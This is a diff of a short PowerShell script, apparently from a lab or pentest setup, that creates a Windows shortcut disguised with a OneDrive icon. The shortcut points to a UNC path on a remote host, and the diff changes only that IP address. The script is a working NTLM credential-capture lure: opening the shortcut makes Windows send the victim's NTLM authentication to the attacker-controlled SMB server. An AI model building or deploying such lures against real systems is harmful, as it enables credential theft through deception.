@@ -1,6 +1,6 @@
 $obj = New-object -comobject wscript.shell
 $link = $obj.createshortcut("C:\Users\champuser\Desktop\ntlm.lnk")
-$link.targetpath = "\\192.168.56.50\NTLM.docx"
+$link.targetpath = "\\10.2.10.191\NTLM.docx"
 $link.windowstyle = "1"
 $link.IconLocation = "C:\Windows\SysWOW64\OneDrive.ico"
 $link.Description = "NTLM Lnk File"
